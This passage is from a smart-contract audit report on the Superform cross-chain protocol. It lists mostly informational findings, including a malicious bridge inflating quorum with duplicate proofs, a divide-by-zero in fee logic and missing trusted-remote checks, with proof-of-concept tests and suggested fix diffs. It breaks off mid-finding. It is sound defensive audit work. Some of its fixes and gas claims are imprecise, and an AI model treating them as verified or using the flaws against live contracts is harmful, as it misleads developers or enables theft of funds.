- Tools Used
- Manual Review

- Recommendations
1. **Implement `unsetTrustedRemote`:** Introduce a function (`unsetTrustedRemote` or equivalent) that allows administrators to unset or update the trusted contract address.
2. **Event Logging:** Enhance the contract with event logging for significant changes, such as setting or unsetting trusted contracts. This improves transparency and auditability.

For example, you can add the below function:

```javascript
event UnsetTrustedRemote(uint16 srcChainId_);

/// @dev Allows protocol admin to unset or remove the trusted remote contract.
/// @param srcChainId_ Source chain ID for which the trusted remote contract is to be unset.
function unsetTrustedRemote(uint16 srcChainId_) external onlyProtocolAdmin {
    // Unset or remove the trusted remote contract for the specified source chain.
    trustedRemoteLookup[srcChainId_] = bytes("");
    emit UnsetTrustedRemote(srcChainId_);
}
```




### Lack of Indexed Fields in Events

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Severity
Informational

- Relevant GitHub Links
https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/interfaces/IERC1155A.sol#L12-L16

https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L106

and all 12 emitted events

- Summary
Events used in the `ERC1155A` contract, declared in the IERC1155A.sol interface, lack indexed fields. This omission may affect the efficiency of off-chain tools that parse events.

- Vulnerability Details
Events in smart contracts are essential for emitting information about state changes that can be observed off-chain. Indexing specific fields in events enhances the efficiency of querying and filtering these events. While indexing adds to the gas cost during emission, it significantly improves the accessibility of event data.

- Impact
The absence of indexed fields in events may not have an immediate functional impact on the `ERC1155A` contract's behavior. However, it could affect the usability of off-chain tools and applications that rely on efficiently parsing event data.

- Tools Used
- Manual review

- Recommendations
It is recommended to review and update the events in the `ERC1155A` contract, implementing the IERC1155A.sol interface, to include appropriate indexed fields. Consider indexing fields that are frequently queried or filtered by off-chain applications.

For example add indexed like this in events:

```solidity
// Add indexed fields to events in ERC1155A contract
event TransmutedBatchToERC20(address indexed user, uint256[] ids, uint256[] amounts);
event TransmutedBatchToERC1155A(address indexed user, uint256[] ids, uint256[] amounts);
event TransmutedToERC20(address indexed user, uint256 id, uint256 amount);
event TransmutedToERC1155A(address indexed user, uint256 id, uint256 amount);
```






### Do not copy source code directly from LayerZero

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- **Severity**
LOW

- **Relevant GitHub Links**
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L10-L12

- **Summary**
The `LayerzeroImplementation.sol` file directly imports source code files from the LayerZero repository instead of utilizing the recommended `solidity-examples` package. This practice is discouraged as it may introduce untested or non-production-ready code into the project.

- **Vulnerability Details**
The direct import of contracts from external repositories poses potential risks:

1. **Unstable Code:** The imported code may be under development, and using it directly can expose the project to unstable or incomplete features.

2. **Security Risks:** Untested code may contain vulnerabilities or security issues that could jeopardize the security of the protocol.

3. **Compatibility Concerns:** Direct imports may not be compatible with the rest of the project, leading to integration issues and possible runtime errors.

- **Impact**
The impact of this issue is moderate. While the immediate consequences might not be severe, relying on untested or non-production-ready code could lead to unexpected problems and hinder the stability of the LayerZero implementation.

- **Tools Used**
- Manual review

- **Recommendations**
To address this issue, the following recommendations are provided:

1. **Switch to `solidity-examples`:** Replace direct imports with statements referencing the `solidity-examples` package for LayerZero contracts.

2. **Stay Informed:** Keep track of updates and releases in the `solidity-examples` package. Regularly check for any changes that might impact the compatibility of your project.

By implementing these recommendations, the project can enhance code stability, reduce potential risks, and align with best practices for importing external contracts.



### Internal keyword used in mappings

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


- **Severity**
Low

- **Relevant GitHub Links**
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L46

- **Summary**
The use of the `internal` keyword with the `failedDeposits` mapping in the `CoreStateRegistry.sol` contract.

- **Vulnerability Details**
The `internal` keyword is not necessary when declaring mappings in Solidity. Mappings are inherently internal by default, and explicitly using the `internal` keyword does not change their visibility. While this does not pose a security risk, it deviates from typical Solidity conventions and might be confusing to developers familiar with standard practices.

- **Impact**
The impact of this issue is minimal. It does not introduce any security vulnerabilities, but it may cause confusion among developers who are accustomed to the standard practice of declaring mappings without the `internal` keyword.

- **Tools Used**
- Manual Review

- **Recommendations**
It is recommended to remove the `internal` keyword from the declaration of the `failedDeposits` mapping. This aligns with standard Solidity conventions and improves code readability without affecting the intended behavior of the mapping.

- Example:
Change:
```solidity
mapping(uint256 => FailedDeposit) internal failedDeposits;
```
to:
```solidity
mapping(uint256 => FailedDeposit) failedDeposits;
```





### Unused constants

**Severity:** Informational

**Context:** [SuperformFactory.sol#L27-L28](superform-core/src/SuperformFactory.sol#L27-L28)

These constants are not used. It is also important to remark that their values do not match those of the enum `PauseStatus`, which has the values PauseStatus.NON_PAUSED = 0 and PauseStatus.PAUSED = 1



### Comment does not apply

**Severity:** Informational

**Context:** [DataLib.sol#L6-L6](superform-core/src/libraries/DataLib.sol#L6-L6)

There is no use of `memory-safe` in `DataLib`.



### Trsuted Remote not checked in the `retryPauload()` & `forceResume()`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:
LayerZero recommends some functions to be must-trusted remote access only. It is recommended so "contracts should only receive messages from known contracts". 
In the protocols LayerZero Implementation only `lzReceive()` is checking for the trusted remote address. Where LayerZero recommends it on 6 functions: `retryPayload()`, `hasStoredPayload()`, `forceResumeReceive()`, `setTrustedRemote()`, `isTrustedRemote()` & `lzReceive()`  
https://layerzero.gitbook.io/docs/evm-guides/master/set-trusted-remotes#trusted-remote-usage

**Recommendation**:
Add trusted remote access on these functions: `retryPayload()`, `hasStoredPayload()`, `forceResumeReceive()`, `setTrustedRemote()` & `isTrustedRemote()`



### `setRequiredMessagingQuorum` does not restrict `srcChainId_`

**Severity:** Informational

**Context:** [SuperRegistry.sol#L345-L345](superform-core/src/settings/SuperRegistry.sol#L345-L345)

**Description**:

The `setRequiredMessagingQuorum` function in the `SuperRegistry` contract is to set the required number of message votes (quorum) to determine the minimum requirements for performing operations on a specific source chain (srcChainId_). In this function, the `quorum_` parameter represents the required number of votes.

However, this function does not restrict the `srcChainId_` parameter to ensure that its value cannot be `0`. This could be a potential problem because `0` could be an invalid source chain identifier. Allowing 0 as the value of `srcChainId_` may cause unexpected behavior or incorrect results.

**Recommendation**:


To solve this problem, you can add a conditional check at the beginning of the function to ensure that the value of `srcChainId_` is not 0. For example:

```solidity
require(srcChainId_ != 0, "Invalid srcChainId");
```

This way, if the value of `srcChainId_` is 0, the function will throw an exception and terminate execution to prevent invalid operations from occurring.



### Missing Zero Address Check

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_



**Description:**


This Function is lack of zero address check in important operation, which may cause some unexpected result.


lib/ERC1155A/src/ERC1155A.sol


```
    function setApprovalForAll(address operator, bool approved) public virtual {
        isApprovedForAll[msg.sender][operator] = approved;
        .....
        emit ApprovalForAll(msg.sender, operator, approved);
    }
    function safeBatchTransferFrom(
        address from,
        address to,
         ...............
        _doSafeBatchTransferAcceptanceCheck(msg.sender, from, to, ids, amounts, data);
    }
    function transmuteBatchToERC20(address owner, uint256[] memory ids, uint256[] memory amounts) external override {
        /// @dev an approval is needed to burn
        _batchBurn(owner, msg.sender, ids, amounts);
               ....................
        emit TransmutedBatchToERC20(owner, ids, amounts);
    }
    function transmuteBatchToERC1155A(
        address owner,
        uint256[] memory ids,
            ................
        emit TransmutedBatchToERC1155A(owner, ids, amounts);
    }
    function transmuteToERC20(address owner, uint256 id, uint256 amount) external override {
        /// @dev an approval is needed to burn
        _burn(owner, msg.sender, id, amount);
        IaERC20(aERC20Token).mint(owner, amount);
        emit TransmutedToERC20(owner, id, amount);
    }
    function transmuteToERC1155A(address owner, uint256 id, uint256 amount) external override {
        address aERC20Token = aErc20TokenId[id];
        if (aERC20Token == address(0)) revert AERC20_NOT_REGISTERED();
             ............
        emit TransmutedToERC1155A(owner, id, amount);
    }

```


**Recommendation:**


Add check of zero address in important operation.



### AMBs can duplicate proofs and increase the quorum any number of times

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:
The BaseStateRegistry::_dispatchPayload function requires the AMB ids to be different so no proof is duplicated. But a malicious AMB could dispatch a proof more than once and reach quorum bypassing other AMB's authority:

```solidity
 function receivePayload(uint64 srcChainId_, bytes memory message_) external override 
// it checks that the sender is a AMB implementation
    onlyValidAmbImplementation {

       
        AMBMessage memory data = abi.decode(message_, (AMBMessage));
       
        if (data.params.length == 32) {
            bytes32 proofHash = abi.decode(data.params, (bytes32));
            // the AMB can increase the quorum any number of times
            // it doesnt check that the AMB has submitted the proof hash already 
            ++messageQuorum[proofHash];

            emit ProofReceived(data.params);
        } 
```

**Recommendation**:
Create a mapping that tracks if a address has already submitted a proof to prevent duplicates, and revert if the same AMB submits the same proof more than once.

```solidity
mapping(bytes32 => mapping(address => bool)) dispatched;
//...
if (data.params.length == 32) {
            bytes32 proofHash = abi.decode(data.params, (bytes32));
           if(dispatched[proofHash][msg.sender])  revert DUPLICATE_PROOF();
            ++messageQuorum[proofHash];

            emit ProofReceived(data.params);
        } 

```



### estimateAckCost(): Wrong implemernation for ``if callback type is return then return 0``

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:.
PaymentHelper.sol.estimateAckCost(): Wrong implemernation for ``if callback type is return then return 0``

The main issue is that in the following lines, it compares v.callbackType to 0 instead of CallbackType.RETRURN, which is actually 1.

[https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L603](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L603)

Therefore, the logic v.callbackType != 0 will match not only the case for CallbackType.RETRURN, but also for CallbackType.FAIL, which is 2, see below: 

```javascript
enum CallbackType {
    INIT,
    RETURN,
    FAIL
}
```

The correct implementation should be comparing it to CallbackType.RETRURN to implement the logic of
 `if callback type is return then return 0`

**Recommendation**:
```diff
 function estimateAckCost(uint256 payloadId_) external view returns (uint256 totalFees) {
        EstimateAckCostVars memory v;
        IBaseStateRegistry coreStateRegistry =
            IBaseStateRegistry(superRegistry.getAddress(keccak256("CORE_STATE_REGISTRY")));
        v.currPayloadId = coreStateRegistry.payloadsCount();

        if (payloadId_ > v.currPayloadId) revert Error.INVALID_PAYLOAD_ID();

        v.payloadHeader = coreStateRegistry.payloadHeader(payloadId_);
        v.payloadBody = coreStateRegistry.payloadBody(payloadId_);

        (, v.callbackType, v.isMulti,,, v.srcChainId) = DataLib.decodeTxInfo(v.payloadHeader);

        /// if callback type is return then return 0
-        if (v.callbackType != 0) return 0;
+       if (v.callbackType == CallbackType.RETRURN ) return 0;


        if (v.isMulti == 1) {
            InitMultiVaultData memory data = abi.decode(v.payloadBody, (InitMultiVaultData));
            v.payloadBody = abi.encode(ReturnMultiData(v.currPayloadId, data.superformIds, data.amounts));
        } else {
            InitSingleVaultData memory data = abi.decode(v.payloadBody, (InitSingleVaultData));
            v.payloadBody = abi.encode(ReturnSingleData(v.currPayloadId, data.superformId, data.amount));
        }

        v.ackAmbIds = coreStateRegistry.getMessageAMB(payloadId_);

        v.message = abi.encode(AMBMessage(coreStateRegistry.payloadHeader(payloadId_), v.payloadBody));

        return _estimateAMBFees(v.ackAmbIds, v.srcChainId, v.message);
    }
```



### Redundant 'virtual' Keyword in 'decimals' Function of aERC20

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Severity**

Informational -> Low

**Relevant GitHub Links**

https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/aERC20.sol#L41-L43

**Summary**

The contract exhibits a low-severity issue related to the use of unnecessary `virtual` in the function signature for the `decimals` function in the `aERC20` contract. This oversight could be a potential source of confusion and adds unnecessary complexity.

**Vulnerability Details**

The `decimals` function in the `aERC20` contract is marked as both `virtual` and `override`. This is redundant unless the function is intended to be further overridden in subsequent contracts. It appears to be a mistake or oversight, as there is no indication that this function is intended to be overridden.

**Impact**

The impact of this issue is relatively low. It introduces unnecessary complexity and may lead to confusion for developers reviewing the code. However, it does not pose a significant security risk.

**Tools Used**

- Manual review

**Recommendations**

To address this issue, it is recommended to remove the `virtual` keyword from the `decimals` function signature in the `aERC20` contract. The corrected function signature should be:

```solidity
/// inheritdoc IaERC20
function decimals() public view override returns (uint8) {
    return tokenDecimals;
}
```

This adjustment removes redundancy and enhances code readability. Additionally, it aligns with the intended behavior, as there is no indication in the contract that the function is meant to be further overridden.



### Incorrect dev commentary on implementation of function

**Severity:** Informational

**Context:** [BaseRouterImplementation.sol#L827-L827](superform-core/src/BaseRouterImplementation.sol#L827-L827)

- Description

The protocol blocks same-chain and xchain transactions to vaults that exceed the limit. As per the dev comments in the `_validateSuperformsData()` function above the `if` condition for the vault limit states 

`/// @dev deposits beyond max vaults per tx is blocked only for xchain`

However, the function itself does not differentiate between the xchain and same-chain (source) transactions. This will inevitably block both the xchain and same-chain transactions that exceed the vault limit set when the contracts are deployed - an example from the deploy script, this would be 5.

However, after speaking with the sponsors on Discord, its been advised that the dev comments are **invalid** and the `if` statement is the desired implementation of the `_validateSuperformsData` function, **so I have submitted this report as a Low instead of a potential Low-Medium.** My reasoning is that if the protocol was to be used by other protocols, the current implementation would be opposite of the commentary given, and the UX would then be impacted until fixed i.e. Expecting the source-chain tx not to limited by the vault limit setting.

- Proof of Concept

The following functions call the `_validateSuperformsData()` function to check the data being passed through 

- `_singleDirectMultiVaultDeposit`
- `_singleXChainMultiVaultDeposit`
- `_singleDirectMultiVaultWithdraw`
- `_singleXChainMultiVaultWithdraw`

Within the `_validateSuperformsData()` there is an if statement that validates whether the tx exceeds the vault limit set, see below.

```solidity
function _validateSuperformsData(
        MultiVaultSFData memory superformsData_,
        uint64 dstChainId_,
        bool deposit_
    )
        internal
        view
        virtual
        returns (bool)
    {
       ...

        /// @dev deposits beyond max vaults per tx is blocked only for xchain
        if (lenSuperforms > superRegistry.getVaultLimitPerTx(dstChainId_)) {
            return false; // @audit this blocks xchain & same-chain tx's
        }
			...
}

```

*As per the dev comments the condition should only block xchain tx’s.*

Due to this if condition both same-chain deposits and withdrawals are blocked if they exceed the vault limit set; which would result in a poor UX, but has no financial impact on the protocol other than potentially loss of gas - **However, as mentioned, this is the desired implementation of the function as per the sponsor.**

- Recommendation:
Revise the developer comments to align with the intended implementation of the `if `statement within the `_validateSuperformsData `function. This adjustment aims to provide a clear understanding of the function's intended implementation, as per the sponsors preference after a discussion.



### `processTx` does not check contract balance

**Severity:** Informational

**Context:** [DstSwapper.sol#L297-L297](superform-core/src/crosschain-liquidity/DstSwapper.sol#L297-L297)

**Description**:

In the `_updateFailedTx` and `getPostDstSwapFailureUpdatedTokenAmount` functions, when the token is `NATIVE`, whether the balance in the contract is sufficient is checked.

```solidity
// _updateFailedTx
if (interimToken_ != NATIVE) {
     if (IERC20(interimToken_).balanceOf(address(this)) < amount_) {
         revert Error.INSUFFICIENT_BALANCE();
     }
} else {
     if (address(this).balance < amount_) {
         revert Error.INSUFFICIENT_BALANCE();
     }
}
// getPostDstSwapFailureUpdatedTokenAmount
if (interimToken == NATIVE) {
     if (address(this).balance < amount) {
         revert Error.INVALID_DST_SWAPPER_FAILED_SWAP_NO_NATIVE_BALANCE();
     }
} else {
     if (IERC20(interimToken).balanceOf(address(this)) < amount) {
         revert Error.INVALID_DST_SWAPPER_FAILED_SWAP_NO_TOKEN_BALANCE();
     }
}
```

However, this situation is not considered in the key `processTx` function. When `approvalToken` is `NATIVE`, if the balance in the contract is insufficient, the function execution will revert.

- poc

```
// test\unit\crosschain-liquidity\DstSwapper.t.sol
function test_failed_native_amount_insufficient() public {
      address payable dstSwapper   = payable(getContract(ETH, "DstSwapper"));
      address payable coreStateRegistry = payable(getContract(ETH, "CoreStateRegistry"));

      vm.selectFork(FORKS[ETH]);
      address native = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

      _simulateSingleVaultExistingPayload(coreStateRegistry, native);
      _simulateSingleVaultExistingPayload(coreStateRegistry, native);

      vm.startPrank(deployer);

      // (bool success,) = payable(dstSwapper).call{ value: 1e18 }("");

      // if (success) {
          bytes memory txData =
              _buildLiqBridgeTxDataDstSwap(1, native, getContract(ETH, "DAI"), dstSwapper, ETH, 1e18, 0);
          vm.expectRevert(); // EvmError: OutOfFund
          DstSwapper(dstSwapper).processTx(1, 0, 1, txData);
      // }
  }
```





**Recommendation**:


```diff
function _processTx(
        uint256 payloadId_,
        uint256 index_,
        uint8 bridgeId_,
        bytes calldata txData_,
        address userSuppliedInterimToken_,
        IBaseStateRegistry coreStateRegistry_
    )
        internal
    {
        if (swappedAmount[payloadId_][index_] != 0) {
            revert Error.DST_SWAP_ALREADY_PROCESSED();
        }

        ProcessTxVars memory v;
        v.chainId = CHAIN_ID;

        IBridgeValidator validator = IBridgeValidator(superRegistry.getBridgeValidator(bridgeId_));
        (v.approvalToken, v.amount) = validator.decodeDstSwap(txData_);// 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ,1

        if (userSuppliedInterimToken_ != v.approvalToken) {
            revert Error.INVALID_INTERIM_TOKEN();
        }
+       if (userSuppliedInterimToken_ == NATIVE) {
+           if (address(this).balance < v.amount) {
+               revert Error.INSUFFICIENT_NATIVE_AMOUNT();
+           }
+       } else {
+           if (IERC20(userSuppliedInterimToken_).balanceOf(address(this)) < v.amount) {
+               revert Error.INSUFFICIENT_BALANCE();
+           }
+        }
......
    }
```



### Wrong dev comment in `registerAERC20` function 

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- **Severity:**

 Informational

- **Relevant GitHub Links:** 

https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/interfaces/IERC1155A.sol#L99-L103

- **Summary:**
The comment in the interface regarding the use of `virtual` appears to be misleading and unnecessary. The comment states, "Function set to virtual so that implementing protocols may introduce RBAC here or perform other changes." However, in Solidity, functions declared in interfaces are implicitly `virtual`, and there is no need to explicitly use the `virtual` keyword. This comment may confuse developers and does not accurately reflect the behavior of Solidity interfaces.

- **Vulnerability Details:**
The comment in question is found in an interface where the `registerAERC20` function is declared. The comment suggests that the function is intentionally marked as `virtual` to allow implementing protocols to introduce RBAC or other changes. However, in Solidity, all functions declared in interfaces are inherently `virtual`, and explicitly using the `virtual` keyword is redundant.

- **Impact:**
The impact of this issue is relatively low. It mainly affects the clarity of the codebase and may mislead developers who read the comment. There are no security risks associated with this comment, but it is recommended to remove it for the sake of accuracy and clarity.

- **Tools Used:**
- Manual review

- **Recommendations:**
1. Remove the comment stating "Function set to virtual so that implementing protocols may introduce RBAC here or perform other changes" from the interface.
2. Update comments to accurately reflect the inherent virtual nature of functions in Solidity interfaces.
3. Consider adding comments that provide meaningful explanations about the purpose and usage of the functions in the interface.

These recommendations aim to improve the accuracy and clarity of the codebase, making it more understandable for developers.



### `_convertToNativeFee` has a divide-by-0 error

**Severity:** Informational

**Context:** [PaymentHelper.sol#L818-L818](superform-core/src/payments/PaymentHelper.sol#L818-L818)

**Description**:

In the `paymentHelper` function, the `_getNativeTokenPrice` function will be called to obtain the price of the specified `chainid`.

```solidity
function _getNativeTokenPrice(uint64 chainId_) internal view returns (uint256) {
         address oracleAddr = address(nativeFeedOracle[chainId_]);
         if (oracleAddr != address(0)) {
             (, int256 dstTokenPrice,, uint256 updatedAt,) = AggregatorV3Interface(oracleAddr).latestRoundData();
             if (dstTokenPrice <= 0) revert Error.CHAINLINK_MALFUNCTION();
             if (updatedAt == 0) revert Error.CHAINLINK_INCOMPLETE_ROUND();
             return uint256(dstTokenPrice);
         }

         return nativePrice[chainId_];
     }
```

But this does not consider the situation when `oracleaddr` is `address (0x0)`, and `nativePrice[chainId_]` is not set. If `oracleAddr == address(0)`, and the result returned by `nativePrice[chainId_]` is 0, that is, the `_getNativeTokenPrice` function will result in 0,

Let's assume a situation that satisfies the above situation, and this situation will happen because the `nativePrice[CHAIN_ID]` value is not set at the beginning.

1. `nativeFeedOracle[chainId_] == address(0x0)`
2. `nativePrice[CHAIN_ID] == 0`

Then `_convertToNativeFee` will have a division by 0 error.


```
function _convertToNativeFee(uint64 dstChainId_, uint256 dstGas_) internal view returns (uint256 nativeFee) {
    /// @dev gas fee * gas price (to get the gas amounts in dst chain's native token)
    /// @dev gas price is 9 decimal (in gwei)
    /// @dev assumption: all evm native tokens are 18 decimals
    uint256 dstNativeFee = dstGas_ * _getGasPrice(dstChainId_);

    if (dstNativeFee == 0) {
        return 0;
    }

    /// @dev converts the gas to pay in terms of native token to usd value
    /// @dev native token price is 8 decimal
    uint256 dstUsdValue = dstNativeFee * _getNativeTokenPrice(dstChainId_); // native token price - 8 decimal

    if (dstUsdValue == 0) {
        return 0;
    }

    /// @dev converts the usd value to source chain's native token
    /// @dev native token price is 8 decimal which cancels the 8 decimal multiplied in previous step
    nativeFee = (dstUsdValue) / _getNativeTokenPrice(CHAIN_ID);//@audit 
}
```


- poc

FILE： test\unit\payments\PaymentHelper.t.sol


```solidity
function test_divisionByZero() public {
    vm.prank(deployer);
    paymentHelper.updateRemoteChain(1, 7, abi.encode(0));
    vm.prank(deployer);
    paymentHelper.updateRemoteChain(1, 1, abi.encode(address(0x0)));

    paymentHelper.nativeFeedOracle(1);//address(0x0)
    paymentHelper.nativePrice(1);// 0

    bytes memory emptyBytes;
    bytes memory txData = _buildDummyTxDataUnitTests(
        BuildDummyTxDataUnitTestsVars(
            1,
            native,
            address(0),
            getContract(ETH, "CoreStateRegistry"),
            ETH,
            ETH,
            1e18,
            getContract(ETH, "CoreStateRegistry"),
            false
        )
    );

    uint8[] memory ambIds = new uint8[](1);
    ambIds[0] = 1;

    vm.expectRevert();// division or modulo by zero (0x12)
    (,,, uint256 fees) = paymentHelper.estimateSingleXChainSingleVault(
        SingleXChainSingleVaultStateReq(
            ambIds,
            137,
            SingleVaultSFData(
                _generateTimelockSuperformPackWithShift(),
                /// timelock
                420,
                420,
                LiqRequest(txData, address(0), address(0), 1, ETH, 420),
                emptyBytes,
                false,
                false,
                receiverAddress,
                emptyBytes
            )
        ),
        true
    );
}
```


**Recommendation**:

```diff
    function _convertToNativeFee(uint64 dstChainId_, uint256 dstGas_) internal view returns (uint256 nativeFee) {
        /// @dev gas fee * gas price (to get the gas amounts in dst chain's native token)
        /// @dev gas price is 9 decimal (in gwei)
        /// @dev assumption: all evm native tokens are 18 decimals
        uint256 dstNativeFee = dstGas_ * _getGasPrice(dstChainId_);

        if (dstNativeFee == 0) {
            return 0;
        }

        /// @dev converts the gas to pay in terms of native token to usd value
        /// @dev native token price is 8 decimal
        uint256 dstUsdValue = dstNativeFee * _getNativeTokenPrice(dstChainId_); // native token price - 8 decimal

        if (dstUsdValue == 0) {
            return 0;
        }

        /// @dev converts the usd value to source chain's native token
        /// @dev native token price is 8 decimal which cancels the 8 decimal multiplied in previous step
+       uint nativeTokenPrice = _getNativeTokenPrice(CHAIN_ID); // native token price - 8 decimal
+       if(nativeTokenPrice == 0) revert Error.INVALID_NATIVE_TOKEN_PRICE();
+       nativeFee = (dstUsdValue) / _getNativeTokenPrice(CHAIN_ID);
    }
```



### BaseStateRegistry::_dispatchPayload Wrong direction for quorum check may block resolution of some payloads

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Summary
A quorum of multiple messaging solutions is used for reliability. When receiving a payload on a destination chain, the registry checks that confirmation has been received from `_getQuorum(sourceChainId)` xChain messaging buses.

However it checks that `_getQuorum(dstChain)` is also provided when dispatching a payload. This can be problematic if the quorum for chain A is set to be 2 for chain B, but on chain B only 1 for chain A.

In that case a message transmitted by chain A to chain B using only 1 messaging bus will be accepted on chain B, but will fail to `processAck` for example, since to dispatch a message from chain B to chain A, 2 messaging buses are needed. And during processing of a payload, the ambIds are reused for processing acknowledgement;

- Impact
Some payloadId end up stuck, if quorum configuration are not symmetrical accross chains

- Code Snippet

- Tool used

Manual Review

- Recommendation
Clearly state that quorum should be symetrical between chain A and chain B



### Wrong comment

**Severity:** Informational

**Context:** [ERC1155A.sol#L110-L110](ERC1155A/src/ERC1155A.sol#L110-L110)

The comment is incorrect - the `safeBatchTransferFrom` function would work with single approvals as well



### # Inability to Update or Remove or Pause an Existing Bridge Addresses

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_




- Description
- The `setBridgeAddresses` function in the `SuperRegistry` contract permits an admin to add new bridge addresses and their corresponding validators. However, once a bridge address and its validator are set, they cannot be changed or removed. This inflexibility poses a risk if a bridge or its validator contract becomes buggy, as users will still be able to interact with it, potentially causing harm to the protocol.
- Additionally, there is a risk associated with bridge upgrades. For example, the protocol uses  **li.fi**, which is a diamond proxy contract and can be upgraded,in case of an upgrade this may changes to the structure of **txData** could render the existing validator contract incompatible. Without the ability to update the validator contract to accommodate such upgrades.
- The inability to update, remove, or pause bridge addresses could lead to operational issues or security vulnerabilities, as users would be always able to use an outdated or potentially insecure version of the bridge.

- Impact
The protocol may be unable to respond to changes in the bridge infrastructure, such as upgrades or deprecations, potentially leading to service disruptions or exposure to security risks if a bridge becomes compromised.

- Recommendation
Modify the `setBridgeAddresses` function to allow protocol admins to update or pause existing bridge addresses and their validators.



### Use ternary operator instead of `if/else`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_



- **Severity**
**Informational/GAS**

- **Relevant GitHub Links**

https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L903-L908

- **Summary**

The proposed change involves replacing an `if/else` block with a ternary operator for a conditional assignment, aiming to enhance gas efficiency.

- **Vulnerability Details**

The proposed change is related to a simple conditional assignment within the codebase. Here is the relevant code snippet:

```solidity
v.approvalAmount = (v.txDataLength == 0) ? vaultData_.amount : v.amountIn;
```

The change aims to replace the following `if/else` block and any other if/else which can be replaced by ternary operator:

```solidity
if (v.txDataLength == 0) {
    v.approvalAmount = vaultData_.amount;
} else {
    v.approvalAmount = v.amountIn;
}
```

- **Impact**

The proposed change has a low impact on the codebase. It primarily focuses on improving gas efficiency by using a ternary operator for a simple conditional assignment. The logic remains unchanged, and the readability of the code may be subject to personal preferences.

- **Tools Used**

- Manual review

- **Recommendations**
Whenever possible; for efficient gas results always use ternary operator instead of `if/else` 




### Pre-Deployment Resolution of Code Architecture, Incentives, and Error Handling in SocketValidator

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


- **Severity**
LOW

- **Relevant GitHub Links**

https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketOneInchValidator.sol#L45

https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketValidator.sol#L67

- **Summary**

The contract `SocketValidator` and `SocketOneInchValidator` contains a comment indicating a missing implementation for token validations in the `validateTxData` function.

Code architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment.

- **Vulnerability Details**

The comment `/// @dev FIXME: add 3. token validations` suggests that token validations are not yet implemented in the `validateTxData` function.

- **Impact**

The missing token validations could potentially impact the correctness of the protocol, especially in scenarios where token-related checks are crucial for ensuring the security and integrity of transactions.

- **Tools Used**

- Manual review

- **Recommendations**

1. **Token Validations:**
   - Complete the implementation of token validations in the `validateTxData` function to ensure that the protocol performs necessary checks related to token transactions.

2. **Code Review Best Practices:**
   - Encourage the development team to conduct a thorough code review after implementing the missing token validations to catch potential issues and ensure code quality.





### Private keys are read from the `.env` environment variable in the deployment scripts

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_



- **Severity:**
LOW

- **Relevant GitHub Links:**
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/script/Abstract.Deploy.Single.s.sol#L289-L298

- **Summary:**
The Superform core deployment scripts, particularly the `AbstractDeploySingle` contract, utilize environment variables to read the `DEPLOYER_KEY_PK` private key from the `.env` file. This approach poses a security risk as any program with access to the process environment can potentially read these variables. Given the privileged status of the deployer and the proposer, unauthorized access to the private key could have detrimental consequences for the Superform's reputation.


- **Vulnerability Details:**
The `setEnvDeploy` function loads the deployer's private key from the `.env` file, which is a common practice but poses risks when dealing with privileged accounts. The Foundry documentation acknowledges this risk and recommends caution, especially in production setups.

- **Impact:**
Unauthorized access to the deployer's private key could lead to unauthorized actions and compromises the security of Superform. The potential impact includes reputational damage and financial loss.

- **Tools Used:**
- Manual code review

- **Recommendations:**
The current practice of managing private keys through environment variables, while suitable for non-privileged deployers or local/test setups, poses a risk in production environments. Considering the severity of the potential impact, the following recommendations are provided:

1. **Explore Alternative Key Management Methods:**
   - Investigate and implement alternative methods for private key management, such as AWS Secret Manager, AWS CloudHSM, AWS KMS External Key Store (XKS), or AWS Nitro Enclaves.

2. **Implement Security Best Practices:**
   - Follow security best practices for key management, ensuring that private keys are stored securely and access is restricted only to authorized processes.





### USDC/USDT Token Address Blacklisting Vulnerability

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- **Severity:**
MEDIUM/LOW

- **Summary:**
